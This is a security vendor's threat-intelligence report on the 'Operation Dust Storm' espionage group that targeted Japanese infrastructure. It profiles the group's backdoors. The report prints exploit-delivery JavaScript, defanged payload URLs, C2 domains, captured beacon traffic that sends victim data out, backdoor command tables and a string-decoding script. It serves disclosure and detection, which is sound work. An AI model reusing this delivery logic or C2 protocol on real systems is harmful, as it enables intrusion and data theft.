{
    "title": "Op_Dust_Storm_Report",
    "text": "1 OPERATION DUST STORM\nDUST  STORM\nBy Jon Gross and \nthe Cylance SPEAR™ Team OPERATION\n砂嵐大作戦\nDUST  \n砂嵐大作戦\nDUST  \nSTORM\n砂嵐大作戦\n STORM\nDUST  \nSTORM\nDUST  \n砂嵐大作戦\nDUST  \nSTORM\nDUST  \nOPERATION\n砂嵐大作戦\nOPERATION\n砂嵐大作\n“Nothing strengthens\n  authority so much as\n1 During analysis of older command and control infrastructure, there were several domains that resolved to known malicious IP addresses in \nSeptember 2009. However, SPEAR was not able to corroborate these dates in any known malware samples.  silence .”TABLE OF CONTENTS\nEXECUTIVE SUMMARY\nCylance SPEAR has uncovered \na long-standing persistent \nthreat targeting numerous \nmajor industries spread across Japan, South Korea, the United \nStates, Europe, and several other \nSoutheast Asian countries.\nPower comes in many forms\nOur research indicates Operation Dust Storm has been \noperational since at least early 2010, and has employed a number of different operational techniques, including spear phishing, waterholes, and zero-day exploits over time. Several antivirus companies initially detected early backdoor samples under the moniker Misdat, but the group has quietly evolved over the years to remain undetected and highly effective. \nAttack telemetry in 2015 indicates the Dust Storm \ngroup has migrated from more traditional government and defense-related intelligence targets to exclusively seek out organizations involved in Japanese critical infrastructure and resources. \nThe group recently compromised a wide breadth of \nvictims across the following industry verticals: electricity generation, oil and natural gas, finance, transportation, and construction. SPEAR’s current research indicates the group’s present focus has shifted to specifically and exclusively target Japanese companies or Japanese subdivisions of larger foreign organizations.The Early Days: Spear Phishing\nThe earliest indications of the group’s activities stem from the compile times of the executable resource section of Misdat samples. All of the early backdoor samples were compiled using a version of Delphi which notoriously mangles the compilation timestamp of the file to June 19, 1992 22:22:17 UTC. By using the executable resource section timestamp, SPEAR was able to more accurately gauge the actual compile times of these samples, and traced one of them, \"bc3b36474c24edca4f063161b25bfe0c90b378b9c19c” ,to January 2010\n1.\n1 OPERATION DUST STORM01 Executive Summary \n01 The Early Days: Spear Phishing\n03 Identity Crisis: Zero-Day Attacks \n04 Into the Future: Japanese Targets \n05 Here and Now: Companies Compromised \n06 Conclusion\n07 Implant Analysis: \n07 Misdat Backdoor (2010-2011)\n10 MiS-Type Hybrid Backdoor (2012) \n13 S-Type Backdoor (2013-2014)\n16 Zlib Backdoor (2014-2015)\n21 Appendix -Leonardo da Vinci2 OPERATION DUST STORM 3 OPERATION DUST STORM 2 The Symantec article incorrectly states that the Gh0st RAT protocol utilizes SSL, when in fact, it uses Zlib compression.Very little public information was available throughout \n2010 on this threat, despite the group’s primary backdoor gaining some level of prominence in targeted Asian attacks. This may be explained by the group’s early reliance on Dynamic DNS domains for their command and control (C2) infrastructure, as well as their use of public RATs like Poison Ivy and Gh0st RAT for second-stage implants. The actors relied heavily on the free Dynamic DNS providers No-IP (http:/ /www.noip.com), Oray (http:/ /www.oray.com/) and 3322 (http:/ /www.pubyun.com/) for their infrastructure continuing into 2011; the earliest known backdoors SPEAR identified communicated to “323332.3322.org” and “1stone.zapto.org” .\nIt wasn’t until June 2011 that Operation Dust Storm \nstarted to garner some notoriety from a series of attacks which leveraged an unpatched Internet Explorer 8 vulnerability, CVE-2011-1255, to gain a foothold into victim networks. In these attacks, a link to the exploit was sent via a spear phishing email from a purported Chinese student seeking advice or asking the target a question following a presentation. Media coverage of these attacks included “http:/ /www.symantec.com/connect/blogs/inside-back-door-attack” ,\n2 and “http:/ /asec.ahnlab.\ncom/730” which named the early backdoor variants “Misdat” . \nThe secondary C2 server from Symantec’s writeup was \nmentioned in news reports elsewhere as “honeywells.tk”; this domain resolved to “111.1.1.66” during early June 2011. This address is coincidentally the same IP address that one of the earliest Misdat samples that SPEAR identified beaconed to during the same timeframe.\nA paper published in August 2011 by Ned Moran via Usenix \n(https:/ /www.usenix.org/system/files/login/articles/  \n105484-Moran.pdf) described in detail an attack by this threat group during April 2011. The attack was initiated by a spear phishing email that contained a Word document embedded with a zero-day Flash exploit (CVE-2011-0611). The final payload described in the report matched other confirmed Misdat samples, and beaconed to “msejake.7766.org” , which first resolved to “125.46.42.221” , then later to “218.106.246.220” at the time of the attack. \nAs to other documented cases, the attacker started \ninteracting with the infected machine within minutes of compromise to begin manual network and host enumeration.\nIn October 2011, the group attempted to take advantage \nof the ongoing Libyan crisis at the time and phish the news cycle regarding Muammar Gaddafi’s death on October 20, 2011. It appears that in addition to some US defense targets, this campaign was also directed at a Uyghur mailing list. This time, the group used a specially crafted malicious Windows Help (.hlp) file, which exploited CVE-2010-1885. The hlp files, when opened, would execute a piece of JavaScript code via “mshta.exe” , which in turn launched a second piece of Visual Basic Script using the Windows scripting host. This secondary piece of VBS code was then responsible for decoding the payload from the body of the hlp file and executing it. \nThe first stage payloads used in these attacks were \nMisdat variants stored base64 encoded within the hlp file. The samples SPEAR identified both communicated to the domain “msevpn.3322.org” , which resolved to the IP address “218.106.246.195” at that time. Pivoting off of this IP address yielded several additional dynamic DNS domains that were used for command and control, as well as several standard domains that were used by the group from May 2010 up until December 2015.\nRegistration Email Address Domain Name Date First Registered\nwkymyx (at) 126.com amazonwikis.com April 21, 2010\nwkymyx (at) 126.com sfcorporation.com May 5, 2010\nwkymyx (at) 126.com adobeus.com June 8, 2011\nduomanmvp (at) 126.com adobekr.com May 30, 2010\nduomanmvp (at) 126.com moviestops.com June 7, 2011\nduomanmvp (at) 126.com moviestops.com December 17, 2012\nFigure 1: Domain Registrations for 2010-2011Early infrastructure for the 2010-2011 timeframe used by the group relied heavily on two email addresses, \"wkymyx (at) 126.com” and “duomanmvp (at) 126.com” , for domain registration.\nThe attackers typically used either seemingly random \nfour-character subdomains or common words like image, blog, ssl, pic, mail, news, etc. There was also evidence to suggest this group attempted to gather user credentials for Yahoo, Windows Live and other accounts through several different phishing domains during July and August 2011. \nWhile SPEAR was unable to recover the original pages \nserved, the domains these pages were hosted on are: “login.live.adobekr.com” , “login.live.wih365.com” , and “yahoomail.adobeus.com” . Individual IP address resolutions for each of the domains were generally short-lived, with none of them lasting more than a month.\nIdentity Crisis: Zero-Day Attacks\nSPEAR identified another Operation Dust Storm campaign in June 2012 that leveraged both CVE-2011-0611, a Flash exploit the group had used previously, and CVE-2012-1889, an Internet Explorer zero-day. The attackers used the domain “mail.glkjcorp.com” to deliver the exploits, and the domain was hosted on the IP address “114.108.150.38” at the time of the attack. SPEAR was unable to definitively tie this particular exploit site to a watering hole or phishing campaign, however, numerous other CN-APT operators leveraged the Internet Explorer zero-day during the same period using both techniques. The exploit domain “glkjcorp.com” was registered shortly before the attack on May 24, 2012. Two different emails were used in the registration of this domain: “effort09 (at) hotmail.com” and “zaizhong16 (at) 126.com” .\nThis attack was the first to use the file “DeployJava.\njs” to fingerprint installed software on victim systems prior to delivery and ensure a known effective exploit was deployed. This JavaScript file was first used and documented by Ahnlab a month earlier in the Gong Da Exploit Kit: http:/ /www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?menu_dist=2&seq=19418. The “DeployJava.js” worked in conjunction with another script embedded in the exploit page, to deliver the Flash exploit if the version of IE was 8 or 9 or deliver the IE zero-day if the version of IE was 6 or 7.\nif (((i9> -1) ||(i8> -1))&&w7>-1&&ja){  \nflash.Movie = vars;  \n} \nelse if((i8>-1)&&(xp>-1)){  \nflash.Movie = vars;  \n} \nelse if((i6>-1||i7>-1)&&(xp>-1)){  \ndocument.body.innerHTML+=”<object classid=\\”clsid:D27CDB6E-AE6D-11cf-9\n6B8-444553540000\\” width=\\”100%\\” height=\\”100%\\” id=\\”ki\\”><param name=\\”mov-ie\\” value=\\””+vars+”\\” /><param name=\\”quality\\” value=\\”high\\” /><param name=\\”bgcolor\\” value=\\”#ffffff\\” /><param name=\\”allowScriptAccess\\” val-ue=\\”sameDomain\\” /><param name=\\”allowFullScreen\\” value=\\”true\\” /><\\/ob-ject>”; \nsetTimeout(“document.body.innerHTML+=\\”<iframe src=faq.htm width=200 height=200><\\/iframe>\\””,2000);  \n}\nFigure 2: JavaScript Snippet for Exploit Delivery Choice\nThe “DeployJava.js” script was used extensively by other APT groups throughout 2012 and 2013, including Nitro in August of \nthe same year.4 OPERATION DUST STORM 5 OPERATION DUST STORMRegistration Email Address Domain Name Date First Registered\nnewsq13 (at) hotmail.com tomshardpc.com March 27, 2013\nnewsq13 (at) hotmail.com wordoscorp.com March 27, 2013\nhouqiangliuliu (at) 163.com projectscorp.net October 9, 2013\nwantsamsung (at) 21cn.com elecarrow.com October 9, 2013\nFigure 4: New C2 Domains Registered in 2013Registration Email Address Domain Name Date First Registered\nysymsq (at) 126.com hkabinc.com March 26, 2014\nmyexmail (at) aol.com exemail.com March 26, 2014\nmyexmail (at) aol.com sslmails.com March 6, 2015\nFigure 5: C2 Domains Registered in 2014 and 2015\nHere and Now: Companies Compromised \nActivity in 2015 was significantly more interesting, and prompted SPEAR \nto begin studying Operation Dust Storm’s other activities. SPEAR identified a number of second-stage backdoors with hardcoded proxy addresses and credentials. These proxy addresses revealed the attacker had compromised a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation. Also of note in this attack: the final payload (hxxp:/ /mail.glkjcorp.com/pic/win.exe) was delivered encoded with a single-byte XOR against the byte 0x95, skipping both the key itself and zero in an attempt to avoid exposing the key. This method of obfuscation at the time would have ensured delivery of the payload past most IDS/IPS systems. The unencoded payload was a hybrid of the older Misdat backdoor and its next generation, the S-Type backdoor. The backdoor would first attempt to use the old Misdat network protocol and communicate to “smtp.adobekr.com” . If that failed, it would fallback to the newer HTTP-based S-Type protocol which communicated with “mail.glkcorp.com” . \nThe group completely abandoned older incarnations of \nthe Misdat backdoor for their first stage implants in 2013, and moved predominantly to the new S-Type backdoors. A full analysis of both of these backdoors is included in the “Implant Analysis” section.Into the Future: Japanese Targets\nSPEAR noticed a fairly large lull in activity from March 2013 to August 2013. Coincidentally (or perhaps not), Mandiant released their APT 1 report on February 19, 2013 (https:/ /www.fireeye.com/blog/threat-research/2013  \n/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html). Activity didn’t cease entirely, but the volume of malware SPEAR was able to collect during this period was remarkably decreased. \nSeveral new domains were registered during this time \nperiod, which would go on to become the crux of the group’s operations for the next several years.\nThere was some anecdotal evidence to suggest Operation \nDust Storm leveraged an Ichitaro zero-day “CVE-2013-5990” to target Japanese victims. This zero-day was first reported publicly on November 12, 2013. Ichitaro is a popular Japanese word processing program designed by a company called JustSystems. While SPEAR was unable to find the exact sample that delivered a Misdat payload, our team analyzed numerous other related samples. The backdoors were encoded within the exploit documents using a very familiar method of XOR’ing skipping zero bytes and the key itself; only this time the key used for encoding was 0x85. \nThroughout 2013, the other incidents SPEAR identified all \ndeployed the S-Type backdoor exclusively. This year also marked an epoch in terms of relying on dual persistence locations in case the victim had lower permissions and couldn’t perform certain actions like writing to the registry or certain file locations. Older techniques like using the “Startup” folder made a resurgence during this time period.\nBeginning in February 2014, there was definitive evidence \nto suggest the group used a watering hole attack on a popular software reseller to deliver an Internet Explorer zero-day, CVE-2014-0322, to a number of unsuspecting targets. The exploit itself was hosted on “hxxp:/ /krtzkj.bz.tao123.biz/error/pic.html” , which at the time of the attack resolved to “126.85.184.190” . During this same time period, the domain “js.amazonwikis.com” also pointed to this IP address and was used in previous attacks that relied on web-based exploits. The intermediate payload “Erido.jpg” was an XOR encoded executable common to other CVE-2014-0322 attacks, which ultimately delivered a variant of the S-Type backdoor to the victim.\nOperation Dust Storm also began to branch out in \n2014 into establishing and finding alternative means of persistence on victim systems. SPEAR identified several second-stage samples that needed to be installed as a ServiceDLL in order to work properly, as well as one that functioned as a router manager for the normal Routing and Remote Access Service. Doing a simple search for this registry key, “HKLM\\System\\CurrentControlSet\\Services\\RemoteAccess\\RouterManagers\\IP\\DllPath” yielded numerous other pieces of malware; however, SPEAR was only able to identify one of the group’s samples that took advantage of this. Several new domains were also registered in 2014 to support expanding operations.\nIn one case that transpired in early February 2015, SPEAR was able to recover the second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance. What caught our attention was the fact that the victim was part of the investment arm of a major Japanese automaker. The attack came just two weeks before eleven unions representing Japan’s autoworkers demanded a monthly raise of six thousand yen. (http:/ /www.bloomberg.com/news/articles/2015-02-18/japan-auto-workers-seek-pay-raise-to-share-in-record-car-profits)\nThe second-stage implants were also programmed and \ncompiled using Microsoft Visual Studio 6, an archaic version of Visual Studio that seems to be preferred by malware authors. Despite using an old version of Visual hxxp://114.142.147.53/deployJava.js  \nhxxp://59.120.59.2/eng/img/deployJava.js  \nhxxp://67.192.225.83/us/deployJava.js  \nhxxp://98.129.119.156/CFIDE/debug/includes/deployJava.js  \nhxxp://gifas.cechire.com/fr/deployJava.js  \nhxxp://goddess.nexon.com.au/inc/deployJava.js  \nhxxp://java.ree.pl/meeting/deployJava.js  \nhxxp://jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js  \nhxxp://naedco.com/img/common/t/deployJava.js  \nhxxp://songwol.co.kr/employee/deployJava.js  \nhxxp://spacexmt.spacedevcoop.com/checkplayer/deployJava.js  \nhxxp://tavis.tw/tmp/deployJava.js  \nhxxp://www.jcsh-web.com.cn/admin/inc/conn/deployjava.js  \nhxxp://www.jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js  \nhxxp://www.toisengyo.jp/24/11/deployjava.js  \nFigure 3: Other Later Targeted Attacks Leveraging DeployJava.js6 OPERATION DUST STORM 7 OPERATION DUST STORMIMPLANT ANALYSIS\nMISDAT BACKDOOR (2010-2011)\nMost early samples of Misdat were not packed; however, following what appeared to be heightened awareness by security \nvendors, samples in late 2010 and 2011 were typically packed with the executable packer, UPX version 3.03 (hxxp:/ /upx.sourceforge.net/). All of the Misdat samples SPEAR identified were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file; as a result, SPEAR was forced to use the resource compile times of samples to get a better idea of when the actual backdoors were compiled.\nFILE CHARACTERISTICS\nSHA256  File Size  Resource Compile Time\n63bd3f80387e3f2c7130bc3b36474c24 edca4f063161b25bfe0c90b378b9c19c67,584 Bytes 01-12-2010 19:09:38 UTC\n74ff3b246fde30bb3c14483279d4b003 12038957e3956bf8682362044ddccf4244,544 Bytes 07-07-2010 19:16:28 UTC\n38238f14d63d14075824cc9afd9a3b84 df9b9c2f1408ac440458196a9e690db622,016 Bytes 07-07-2010 19:16:28 UTC\n2978c6cfff1754c85a4a22b6a72dc9e60b-596b54e65ed5ab2c80b8bc259ca5dc22,016 Bytes 08-16-2011 00:27:02 UTC\n580c7ed2b624a0dfa749909d3e110704 65bd310663d30fb6fe3532ad45d57b8a43,008 Bytes 08-16-2011 00:27:02 UTC\n861edc857e53ff072947c2befc3c372c9 a954a7de5c48c53b99c64ff99b69dbd43,008 Bytes 08-16-2011 00:27:02 UTC\n4241a9371023e7452475117ff1fcd672 62dab56bf1943b5e0c73ff2b2e41f87623,040 bytes 10-21-2011 20:05:48 UTC\nFile characteristics and resource compile times of known Misdat samples.\nHOST-BASED INDICATORS\nVolatile Evidence:\n• Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprising the volume serial number, decrypted network configuration data, and encoded campaign identifier\nFile System Modifications:\n• The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe\n• It may attempt to open then delete the file C:\\2.hiv, c:\\t2svzmp.kbp, or c:\\tmp.kbm depending on the sample. Later versions from 2011 all used c:\\t2svzmp.kbp\nRegistry Modifications:\n• The malware may create the registry key HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, or HKCU\\Software\\Backtsaleht\\StubPath for persistence\n• In SPEAR’s tests, StubPath always pointed to the newly created msdtc.exe binary within the %CommonFiles% directory, with either the “/ok” or “/start” switch depending on the sample\n• May create the Registry Key HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} or HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} Studio, the backdoor is well designed by comparison and provides a full suite of functionality to the attacker. \nNo antivirus vendors seem to reliably detect most of \nthe variants SPEAR identified.\nPerhaps even more interesting was the fact that the \ngroup adopted and eventually customized several Android backdoors to suit their purposes in the beginning of 2015. The group rapidly expanded their mobile operations in May 2015. The initial backdoors were relatively simple, and would continually forward all SMS messages and call information back to the C2 servers. Later variants became much more complex, and included the ability to enumerate and exfiltrate specific files directly from the infected devices. \nAll of the identified victims for the Android Trojans resided \nin Japan or South Korea. The infrastructure to support the Android campaigns was massive in comparison to previous operations. More than two hundred domains have been identified to date. SPEAR plans to release more information regarding this threat shortly.\nSPEAR discovered two more waves of attacks that \nstarted in July 2015 and October 2015. Interestingly, one of the primary targets was a Japanese subsidiary of a South Korean electric utility. Similarly, SPEAR identified a separate intrusion into a major Japanese oil and gas company. The exact motivations for this particular attack were unclear; however, if this attack coincided with all previous operations, the most likely goals were reconnaissance and long-term espionage. \nCONCLUSION\nAt this time, SPEAR does not believe the attacks were meant to be destructive or disruptive. However, our team believes that attacks of this nature on companies involved in Japanese critical infrastructure and resources are ongoing and are likely to continue to escalate in the future.\nIt’s clear from SPEAR’s research that Operation Dust Storm has slowly evolved over time to become increasingly effective. \nEarly operations were extremely blunt, relatively unsophisticated, and readily picked up by the security industry. As the group became more and more focused on Japan, less and less of their tactics and malware appeared in reports or write-ups. The targets identified escalated both in size and in the scope of affected industries. \nAs a result, SPEAR felt obligated to share with the community and public what was discovered recently, to hopefully stunt the \nattackers’ progress for a time. SPEAR has been closely following the aftermath of public reporting. We have decided that even though disclosure often forces attackers to change, it also enables defenders to better detect and expel “real” threats from their environments. \nSPEAR would like to thank the Japanese Computer Emergency Response Team (JP-CERT) for their cooperation, assistance, and \ntime during our investigation.\nNOTE: A large number of the older Misdat domains were sinkholed by a private entity in late December 2015. The \ndomains currently point to the IP address “58.158.177.102” . If anyone has more information or knows who operates this sinkhole, please contact us at: threat-intel [at] cylance [dot] com.8 OPERATION DUST STORM 9 OPERATION DUST STORMNETWORK-BASED INDICATORS\nObserved network traffic was always base64 encoded plain text over a raw socket to common ports like 80, 443, or 1433. A \nsample initial beacon packet is shown below.\nlogon|{Hostname}|Windows XP|100112|bd56d32fbda703a98c87689c92325d90|\nFigure 6: Initial Beacon Packet Base64 Decoded\nThe string “logon” always preceded any other information. In the instance above, the hostname of the victim’s system, operating system version, unique sample identifier (SPEAR believes this is a date: 1/12/2010), as well as the unique MD5 used for the mutex were sent to the server. Once it registers with the C2, the backdoor sends the string “YWN0aXZlfA==” which decodes to “active|” . The backdoor will then continue to send that string and wait until it receives one of the following commands from the C2 server:\nCommand Function\nshellInitiates a new connection that provides shell functionality to the attacker to execute commands. Subcommands include shellstart, command and stop.\nfilesInitiates a new connection that provides file management and enumeration capabilities to the attacker. Subcommands include filelist, dirlist, driver (enu-merates logical drives), renamefile, delete, run, open and stop.\nupload Provides the ability to upload files directly to the C2.\ndown Provides the ability to download files from the C2.\nrestart Restarts the victim system through a call to the Windows API ExitWindowsEx.\ncloseos Shuts down the system via ExitWindowsEx API.\ndclose Closes the socket connection to the C2.\nuclose Appears to do the same as the dclose command.\nunintallDeletes the Active Setup registry key and deletes the backdoor before termi-nating the process.\nFigure 7: Network Commands Supported by the Misdat Backdoor\nDETAILS\nThe backdoors were relatively simple and provided the attacker the ability to upload and download files, manipulate and enumerate files, execute shell commands, disconnect from the C2, uninstall the backdoor, and shutdown or restart the system. The backdoors could also potentially take the command line parameters “/ok” or “/start”; the switches changed the user context under which the process runs. If no switch was provided when executed, the backdoor will copy itself to “%CommonFiles%\\{Unique Identifier}\\msdtc.exe” , where the unique identifier is the first ten characters of the MD5 hash used as the mutex. It will then configure one of the Active Setup and associated registry keys above to establish persistence on the system. \nSPEAR identified and reversed the encoding mechanism used for obfuscating network callback information and what appeared \nto be a unique campaign identifier. The following script can be used to decode these obfuscated strings.def decode_chars(a, b):  \n    return chr((26 * (ord(a) - ord('A'))) + (ord(b) - ord('A')))\ndef decode(s):  \n rolling_key = 0x783  \n result = \"\"  \n for index in xrange(len(s)/2):  \n  result += decode_chars(s[index * 2], s[(index * 2) + 1])  \n real_result = \"\"  \n for index in xrange(len(result)):  \n  i = index + 1  \n  real_result += chr(((rolling_key >> 8) & 0xff) ^ ord(result[i - 1]))  \n  rolling_key = 0xdbd9 * (ord(decode_chars(s[index * 2], s[(index * \n2) + 1])) + rolling_key) + 0xda3b  \n return real_result\nFigure 8: Python Script for Decoding Obfuscated Misdat Strings\nFILE CHARACTERISTICS\nSHA256  Campaign ID  Network Callback\n63bd3f80387e3f2c7130bc3b36474c24 \nedca4f063161b25bfe0c90b378b9c19cWNADomain: 323332.3322.org Ports: 80, 443, 1433\n74ff3b246fde30bb3c14483279d4b003 12038957e3956bf8682362044ddccf42XSIDomain: 323332.3322.orgPorts: 80,443, 1433\n38238f14d63d14075824cc9afd9a3b84 df9b9c2f1408ac440458196a9e690db6UALDomain: msejake.7766.orgPorts: 80, 443, 1433\n2978c6cfff1754c85a4a22b6a72dc9e6 0b596b54e65ed5ab2c80b8bc259ca5dcQPODomain: msevpn.3322.orgPorts: 80, 443, 8080\n580c7ed2b624a0dfa749909d3e1107046 5bd310663d30fb6fe3532ad45d57b8aQPODomain: msevpn.3322.orgPorts: 80, 443, 8080\n861edc857e53ff072947c2befc3c372c9a 954a7de5c48c53b99c64ff99b69dbdQPODomain: msevpn.3322.orgPorts: 80, 443, 8080\n4241a9371023e7452475117ff1fcd672 62dab56bf1943b5e0c73ff2b2e41f876YAMDomain: msevpn.3322.orgPorts: 80, 443, 8080\nFigure 9: Decoded Campaign Identifiers and Network Callback Information\nAlso of interest was the fact that all of the samples would attempt to detect whether or not the victim was using a Japanese keyboard via a call to the Windows API “GetKeyboardType” and report that fact back to the attacker.10 OPERATION DUST STORM 11 OPERATION DUST STORMMIS-TYPE HYBRID BACKDOOR (2012)\nIn 2012, Operation Dust Storm slowly migrated to a hybridized backdoor, which actually contained two entirely separate \nbackdoors within the same binary. This backdoor would first attempt to establish an interactive shell using the Misdat base64 encoded network protocol over a raw TCP socket. If the initial communication to the first C2 failed, the backdoor would fallback to a secondary HTTP-based protocol and communicate to an alternate C2. Hybrid variants SPEAR identified were compressed with UPX version 3.03.\nFILE CHARACTERISTICS\nSHA256  File Size  Resource Compile Time\nb1aed59dc59a4ef4c7d2b6e67983e4867e 04ba35c42372eb3b6ad969bd6a604130,720 Bytes 02-23-2012 14:47:18 UTC\n93c1c7a666833f5f68d2315dc014dc6c2 446c91c848130e228e84376b0aaf44130,720 Bytes 06-18-2012 22:39:02 UTC\nFigure 10: File Details of the Hybrid Backdoors\nHOST-BASED INDICATORS\nVolatile Evidence:\n• Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprised of the volume serial number, decrypted network configuration data, encoded network configuration data, and encoded campaign identifier\n• May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “fuck~!@6”{Unique Identifier}”\n• May create the folder %System%\\{Unique Identifier} temporarily.\n• May create files in %AppData%\\{Unique Identifier} that end in “tmp.exe”\n• May create the files:\n• %AppData%\\{Unique Identifier}\\HOSTRURKLSR\n• Contains the results of the command “cmd.exe /c ipconfig /all”\n• %AppData%\\{Unique Identifier}\\NEWERSSEMP\n• Contains the results of the command “cmd.exe /c net user {Username}” \nFile System Modifications:\n• The backdoor will copy itself to %AppData%\\{Unique Identifier}\\msdtc.exe – where the unique identifier is the first ten characters of the MD5 hash\nRegistry Modifications:\n• The malware may create the registry key HKCU\\Software\\bkfouerioyou\n• Creates the value StubPath pointing to %AppData%\\{Unique Identifier}\\msdtc.exe\n• Will create one of these registry keys for persistence:\n• HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1- {Unique Identifier} – First 12bytes\n• HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1- {Unique Identifier} – First 12bytes\nNETWORK-BASED INDICATORS \nThe malware will make DNS requests for the domains “smtp.adobekr.com” and “mail.glkjcorp.com” or “auto.glkjcorp.com” . Both samples were configured to communicate first to “smtp.adobekr.com” using the Misdat network protocol described above over TCP port 80, 443, and 25. If a response was not received from the C2, the samples would fallback to the secondary HTTP protocol and communicate to the alternate C2 using the same TCP ports.POST /index.asp HTTP/1.1  \nAccept: Accept: */*, /index.asp, mail.glkjcorp.com  \nContent-Type: application/x-www-form-urlencoded  \nUser-Agent: FirefoxApp  \nHost: mail.glkjcorp.com  \nContent-Length: 334  \nCache-Control: no-cache\nid=e263314342d1f1b9&type=post&stype=info&data=V2luZG93cyBYUA0KTUFMV0FSRS9j-\ndWNrb28vQWRta W5pc3RyYXRvcnMNCkNyZWF0ZSBVc2VyIExvc3RfZTI2MzMxI-FN1Y2Nlc3MuDQpDcmVhdGUgRGlyIFN1Y2Nlc3 MuDQpXcml0ZSBSZWdLZXkgRX-Jyb3IuDQpGaWxlU3lzdGVtIDogTlRGUw0KU3lzdGVtIFJ1blRpbWU6MCBkYXkwI GhvdXJzMTUgbWludXRlcw0KDQoNCiBDb3VudCA9IDANCk9wZW5TY01hbmFnZXIgT0suDQo= \nFigure 11: Initial S-Type Beacon\nThe initial POST request always used the static User-Agent “FirefoxApp” and contained operating system information, user \ninformation, the results of several permissions tests, the file system, and system uptime. If the backdoor did not receive a response, it would then try to communicate the same base64 encoded information in the URI of a GET request.\nWindows XP  \n{Hostname}/{Username}/Administrators  \nCreate User Lost_e26331 Success.  \nCreate Dir Success.  \nWrite RegKey Error.  \nFileSystem : NTFS  \nSystem RunTime:0 day0 hours15 minutes  \nCount = 0  \nOpenScManager OK.\nFigure 12: Contents of the Decoded POST Request from the Figure Above\nFollow-on requests used the User-Agent of the default browser on the system as evidenced below.\nGET /index.asp?mmid=e263314342d1f1b9 HTTP/1.1  \nAccept: */*  \nAccept-Language: en-us  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; \n.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)  \nAccept-Encoding: gzip, deflate  \nHost: mail.glkjcorp.com  \nConnection: Keep-AliveOpenScManager OK.\nFigure 13: Follow-on HTTP Traffic\nThe id and mmid fields in the figures above both used the first 16 characters of the unique identifier created for the mutex. The \nMisdat protocol provided the attacker most of the features of a full-fledged backdoor, while the secondary protocol appeared to primarily be used as an update mechanism to load additional malware on the system. 12 OPERATION DUST STORM 13 OPERATION DUST STORMNETWORK-BASED INDICATORS\nDETAILS\nThe backdoor could be executed with three different switches, “/ok” , “/Start” , or “/fuck” . These switches affected the context \nunder which the process would be run and whether or not the binary would delete itself once executed.\nSwitch Descriptive Purpose Self-Delete\n/okExecuted the malware directly under the current running process using the context of the user that started the application (can be system).No\n/StartExecuted the malware under explorer.exe in the context of whatever user executed the application (can be system). This was the switch used by the malware when setting persistence in the registry.No\n/fuckForced execution of the malware under explorer.exe in the context of the user running explorer.exe (scanned active processes and located the explorer process).No\nNoStarted the malware in a process called msdtc.exe which ran as an orphaned process under explorer.exeYes\nFigure 14: Description of Command Line Execution Switches for the Backdoor\nThe backdoor attempted to run a number of tests to determine the privilege level of the compromised user, including whether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager via a call to “OpenSCManagerA” . \nThe user test was performed by utilizing the NetUserAdd and NetUserDel Windows APIs; the test attempted to create the \ntemporary user “Lost_{Unique Identifier}” with the password “fuck~!@6{Unique Identifier}” . If the secondary network protocol was activated, the backdoor would also execute two commands via the command interpreter to gather system information: “cmd.exe /c ipconfig /all” and “cmd.exe /c net user {Username}” . It would temporarily write the output of these commands to the files, “%AppData%\\{Unique Identifier}\\HOSTRURKLSR” and “%AppData%\\{Unique Identifier}\\NEWERSSEMP” respectively. This information was then base64 encoded and transmitted to the C2 server within the URI of a GET request. The S-Type network protocol is described in greater detail below. Also of note is that the backdoor would continue to attempt to beacon to “smtp.adobekr.com” on port 25 even if communication to the secondary C2 could be established.\nThe configuration information contained within these backdoors could be decoded using the same script provided in Figure 8.\nFILE CHARACTERISTICS\nSHA256 Network Callbacks Identifier\nb1aed59dc59a4ef4c7d2b6e67983e4867 \ne04ba35c42372eb3b6ad969bd6a6041Primary: smtp.adobekr.comSecondary: hxxp:/ /mail.glkjcorp.com/index.aspTCP Port: 80, 443, 25HLD\n93c1c7a666833f5f68d2315dc014dc6c24 46c91c848130e228e84376b0aaf441Primary: smtp.adobekr.comSecondary: hxxp:/ /auto.glkjcorp.com/us/index.aspTCP Port: 80, 443, 25GKB\nFigure 15: Secondary C2 Servers and Campaign Identifiers by SampleS-TYPE BACKDOOR (2013-2014)\nAfter experimenting with a hybrid of the Misdat and S-Type backdoors, in 2013 Operation Dust Storm abandoned the earlier Misdat network protocol entirely. This was likely a direct result of the demonstrated effectiveness of an HTTP-based protocol for command and control, or simply an adaptation to more corporations leveraging web-based proxies. All samples identified were programmed using Borland Delphi and made use of custom classes to implement common backdoor functionality. The majority of samples SPEAR identified in 2013 were packed with UPX version 3.03, while later 2014 variants were not.\nFILE CHARACTERISTICS\nSHA256 File Size Resource Compile Time\n83399bd0e09b2c2886a58890bbbf6a8d 4e6cd3aa32b091045dd6739c637acfd532,768 Bytes HLD\nFigure 16: File Characteristics of the S-Type Backdoor\nHOST-BASED INDICATORS\nVolatile Evidence:\n• May create a mutex named “{Unique Identifier}_KB10B2D1_CIlFD2C”\n• May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}”\n• May create the folder %System%\\{Unique Identifier} temporarily\nFile System Modifications:\n• The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe while other observed variants used %Appdata%\\{Unique 